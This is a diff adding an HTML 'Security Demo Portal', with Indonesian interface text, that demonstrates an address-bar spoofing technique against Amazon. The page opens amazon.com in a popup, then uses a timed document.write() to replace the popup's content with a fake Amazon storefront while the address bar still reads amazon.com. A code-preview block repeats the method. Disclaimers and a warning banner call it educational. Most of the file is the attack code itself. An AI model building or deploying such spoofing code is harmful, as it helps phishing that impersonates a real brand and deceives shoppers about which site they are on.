@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Secure Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 500px;
+            width: 100%;
+            animation: fadeIn 0.5s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .btn {
+            background: linear-gradient(to right, #4facfe 0%, #00f2fe 100%);
+            color: white;
+            border: none;
+            padding: 16px 40px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(79, 172, 254, 0.4);
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-decoration: none;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(79, 172, 254, 0.6);
+        }
+        
+        .btn:active {
+            transform: translateY(-1px);
+        }
+        
+        .btn.amazon {
+            background: linear-gradient(to right, #ff9900 0%, #ff6600 100%);
+            box-shadow: 0 4px 15px rgba(255, 153, 0, 0.4);
+        }
+        
+        .btn.amazon:hover {
+            box-shadow: 0 8px 25px rgba(255, 153, 0, 0.6);
+        }
+        
+        .status {
+            margin-top: 25px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 10px;
+            border-left: 4px solid #4facfe;
+            text-align: left;
+            font-size: 14px;
+            color: #555;
+            display: none;
+        }
+        
+        .status.active {
+            display: block;
+            animation: slideIn 0.3s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 25px;
+            font-size: 14px;
+            text-align: left;
+        }
+        
+        .warning h4 {
+            margin-bottom: 8px;
+            color: #856404;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            color: rgba(255, 255, 255, 0.8);
+            text-align: center;
+            font-size: 14px;
+            max-width: 500px;
+        }
+        
+        .code-block {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            margin-top: 20px;
+            text-align: left;
+            overflow-x: auto;
+            white-space: pre-wrap;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🛡️ Security Demo Portal</h1>
+        <p class="subtitle">Demonstrasi teknik race condition untuk penelitian keamanan web</p>
+        
+        <div class="warning">
+            <h4>⚠️ PERHATIAN</h4>
+            <p>Demo ini hanya untuk tujuan edukasi dan testing keamanan. Penggunaan untuk aktivitas ilegal dilarang keras.</p>
+        </div>
+        
+        <div style="margin: 30px 0;">
+            <button class="btn amazon" onclick="startAmazonSpoof()">
+                <i class="fas fa-external-link-alt"></i> Buka Amazon Spoof Demo
+            </button>
+            
+            <button class="btn" onclick="startSecureSpoof()">
+                <i class="fas fa-shield-alt"></i> Buka Secure Version
+            </button>
+        </div>
+        
+        <div id="status" class="status"></div>
+        
+        <div class="code-block" id="codePreview">
+// Kode Race Condition
+function startSpoof() {
+    const win = window.open('https://www.amazon.com', 'amazonSpoof');
+    setTimeout(() => {
+        win.document.write('&lt;h1&gt;Fake Content&lt;/h1&gt;');
+    }, 100);
+}
+        </div>
+    </div>
+    
+    <div class="footer">
+        <p>© 2024 Security Research Demo | Hanya untuk tujuan edukasi</p>
+        <p>Semua merek dagang adalah hak milik pemiliknya masing-masing</p>
+    </div>
+
+    <script>
+        let spoofedWindow = null;
+        let isActive = false;
+        let monitoringInterval = null;
+        
+        // Fungsi utama untuk spoofing Amazon
+        function startAmazonSpoof() {
+            updateStatus('Membuka Amazon.com...', 'info');
+            
+            // Coba buka jendela dengan nama spesifik
+            try {
+                // Method 1: Classic race condition approach
+                const newWindow = window.open('', 'amazonWindow');
+                
+                if (newWindow) {
+                    // Quickly navigate to Amazon
+                    newWindow.location.href = 'https://www.amazon.com';
+                    
+                    // Setup content override after short delay
+                    setTimeout(() => {
+                        overrideAmazonContent(newWindow);
+                    }, 300);
+                    
+                    spoofedWindow = newWindow;
+                    startMonitoring();
+                    
+                    updateStatus('Amazon spoof berhasil diinisialisasi', 'success');
+                } else {
+                    updateStatus('Popup diblokir oleh browser', 'error');
+                }
+            } catch (error) {
+                updateStatus(`Error: ${error.message}`, 'error');
+            }
+        }
+        
+        // Fungsi untuk override konten Amazon
+        function overrideAmazonContent(targetWindow) {
+            if (!targetWindow || targetWindow.closed) return;
+            
+            try {
+                // Cek jika window masih di Amazon
+                if (targetWindow.location.hostname.includes('amazon')) {
+                    // Tulis konten custom ke dalam window
+                    targetWindow.document.open();
+                    targetWindow.document.write(`
+                        <!DOCTYPE html>
+                        <html lang="en">
+                        <head>
+                            <title>Amazon.com: Online Shopping</title>
+                            <meta charset="UTF-8">
+                            <meta name="viewport" content="width=device-width, initial-scale=1">
+                            <style>
+                                * { margin: 0; padding: 0; box-sizing: border-box; }
+                                body { font-family: Arial, sans-serif; background: #f3f3f3; }
+                                .amazon-header {
+                                    background: #232f3e;
+                                    padding: 15px 20px;
+                                    display: flex;
+                                    align-items: center;
+                                    gap: 20px;
+                                }
+                                .amazon-logo {
+                                    color: #ff9900;
+                                    font-size: 28px;
+                                    font-weight: bold;
+                                    font-style: italic;
+                                }
+                                .nav-links {
+                                    display: flex;
+                                    gap: 20px;
+                                    color: white;
+                                }
+                                .container {
+                                    max-width: 1200px;
+                                    margin: 0 auto;
+                                    padding: 20px;
+                                }
+                                .product-grid {
+                                    display: grid;
+                                    grid-template-columns: repeat(4, 1fr);
+                                    gap: 20px;
+                                    margin-top: 30px;
+                                }
+                                .product-card {
+                                    background: white;
+                                    border-radius: 5px;
+                                    padding: 15px;
+                                    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+                                    text-align: center;
+                                }
+                                .warning-banner {
+                                    background: #ffeaa7;
+                                    border: 2px dashed #fdcb6e;
+                                    padding: 15px;
+                                    margin: 20px 0;
+                                    border-radius: 5px;
+                                    text-align: center;
+                                    color: #856404;
+                                }
+                                .footer {
+                                    background: #232f3e;
+                                    color: white;
+                                    padding: 20px;
+                                    text-align: center;
+                                    margin-top: 40px;
+                                }
+                            </style>
+                        </head>
+                        <body>
+                            <div class="amazon-header">
+                                <div class="amazon-logo">amazon</div>
+                                <div class="nav-links">
+                                    <span>Today's Deals</span>
+                                    <span>Customer Service</span>
+                                    <span>Registry</span>
+                                    <span>Gift Cards</span>
+                                    <span>Sell</span>
+                                </div>
+                            </div>
+                            
+                            <div class="container">
+                                <div class="warning-banner">
+                                    <h2>⚠️ SECURITY DEMONSTRATION</h2>
+                                    <p>This is a fake Amazon page for security research purposes.</p>
+                                    <p><strong>Address bar shows: amazon.com</strong></p>
+                                    <p>But this content is completely controlled by the demo script.</p>
+                                </div>
+                                
+                                <h1 style="margin: 20px 0; color: #333;">Welcome to Amazon Spoof Demo</h1>
+                                
+                                <div class="product-grid">
+                                    <div class="product-card">
+                                        <h3>Security Book</h3>
+                                        <p>Learn about web security</p>
+                                        <p style="color: #B12704; font-weight: bold;">$29.99</p>
+                                    </div>
+                                    <div class="product-card">
+                                        <h3>Encryption Tool</h3>
+                                        <p>Secure your data</p>
+                                        <p style="color: #B12704; font-weight: bold;">$49.99</p>
+                                    </div>
+                                    <div class="product-card">
+                                        <h3>VPN Service</h3>
+                                        <p>Private browsing</p>
+                                        <p style="color: #B12704; font-weight: bold;">$9.99/month</p>
+                                    </div>
+                                    <div class="product-card">
+                                        <h3>Password Manager</h3>
+                                        <p>Secure passwords</p>
+                                        <p style="color: #B12704; font-weight: bold;">$39.99</p>
+                                    </div>
+                                </div>
+                                
+                                <div style="margin-top: 30px; padding: 20px; background: #e3f2fd; border-radius: 5px;">
+                                    <h3>🔍 Technical Details:</h3>
+                                    <p><strong>Current URL:</strong> ${targetWindow.location.href}</p>
+                                    <p><strong>Window Control:</strong> Active</p>
+                                    <p><strong>Demo Mode:</strong> Spoofing with document.write()</p>
+                                </div>
+                            </div>
+                            
+                            <div class="footer">
+                                <p>Amazon Spoof Demo - For Educational Purposes Only</p>
+                                <p>This is not the real Amazon.com website</p>
+                            </div>
+                            
+                            <script>
+                                // Script untuk mempertahankan kontrol
+                                setInterval(() => {
+                                    try {
+                                        if (window.location.hostname.includes('amazon')) {
+                                            // Tetap di Amazon domain
+                                        }
+                                    } catch(e) {
+                                        // Error handling
+                                    }
+                                }, 1000);
+                            <\/script>
+                        </body>
+                        </html>
+                    `);
+                    targetWindow.document.close();
+                    
+                    updateStatus('Konten Amazon berhasil dioverride dengan custom content', 'success');
+                }
+            } catch (error) {
+                updateStatus(`Gagal override konten: ${error.message}`, 'error');
+            }
+        }
+        
+        // Fungsi secure version (tanpa spoofing)
+        function startSecureSpoof() {
+            updateStatus('Membuka versi secure...', 'info');
+            
+            const secureWindow = window.open('', 'secureDemo', 'width=800,height=600');
+            
+            if (secureWindow) {
+                secureWindow.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <title>Secure Demo</title>
+                        <style>
+                            body { font-family: Arial; padding: 40px; }
+                            .secure-banner { background: #d4edda; color: #155724; padding: 20px; border-radius: 5px; }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="secure-banner">
+                            <h1>✅ Secure Demo Window</h1>
+                            <p>This is a legitimate demo window without address bar spoofing.</p>
+                            <p>Address bar shows actual URL: ${secureWindow.location.href || 'about:blank'}</p>
+                        </div>
+                        <p>No deceptive techniques used in this demo.</p>
+                    </body>
+                    </html>
+                `);
+                secureWindow.document.close();
+                
+                updateStatus('Versi secure berhasil dibuka', 'success');
+            }
+        }
+        
+        // Fungsi untuk monitoring window
+        function startMonitoring() {
+            if (monitoringInterval) clearInterval(monitoringInterval);
+            
+            monitoringInterval = setInterval(() => {
+                if (!spoofedWindow || spoofedWindow.closed) {
+                    updateStatus('Window spoof telah ditutup', 'warning');
+                    clearInterval(monitoringInterval);
+                    isActive = false;
+                    return;
+                }
+                
+                try {
+                    // Cek status window
+                    if (spoofedWindow.location.hostname.includes('amazon')) {
+                        // Masih di Amazon, kontrol aktif
+                        isActive = true;
+                    } else {
+                        // Telah berpindah dari Amazon
+                        updateStatus('Window berpindah dari Amazon domain', 'warning');
+                        isActive = false;
+                    }
+                } catch (error) {
+                    // Cross-origin error, window masih ada tapi tidak bisa diakses
+                    isActive = true;
+                }
+            }, 500);
+        }
+        
+        // Fungsi update status
+        function updateStatus(message, type = 'info') {
+            const statusDiv = document.getElementById('status');
+            
+            const colors = {
+                'info': '#4facfe',
+                'success': '#28a745',
+                'error': '#dc3545',
+                'warning': '#ffc107'
+            };
+            
+            statusDiv.innerHTML = `
+                <strong style="color: ${colors[type] || colors.info}">
+                    ${type.toUpperCase()}:
+                </strong> ${message}
+                <br><small>${new Date().toLocaleTimeString()}</small>
+            `;
+            statusDiv.className = 'status active';
+            
+            // Auto hide setelah 5 detik
+            setTimeout(() => {
+                statusDiv.className = 'status';
+            }, 5000);
+        }
+        
+        // Cleanup saat page ditutup
+        window.addEventListener('beforeunload', () => {
+            if (spoofedWindow && !spoofedWindow.closed) {
+                spoofedWindow.close();
+            }
+            if (monitoringInterval) {
+                clearInterval(monitoringInterval);
+            }
+        });
+        
+        // Update code preview
+        document.getElementById('codePreview').textContent = `// Kode Race Condition Spoofing
+function startAmazonSpoof() {
+    // Buka window dengan nama spesifik
+    const win = window.open('', 'amazonWindow');
+    
+    // Navigasi ke Amazon dengan cepat
+    win.location.href = 'https://www.amazon.com';
+    
+    // Set timeout untuk override konten
+    setTimeout(() => {
+        if (win && !win.closed) {
+            // Gunakan document.write() untuk timpa konten
+            win.document.open();
+            win.document.write('<h1>Custom Content Here</h1>');
+            win.document.close();
+        }
+    }, 300);
+    
+    // Mulai monitoring
+    startMonitoring(win);
+}`;
+    </script>
+    
+    <!-- Font Awesome untuk ikon -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/js/all.min.js"></script>
+</body>
+</html>
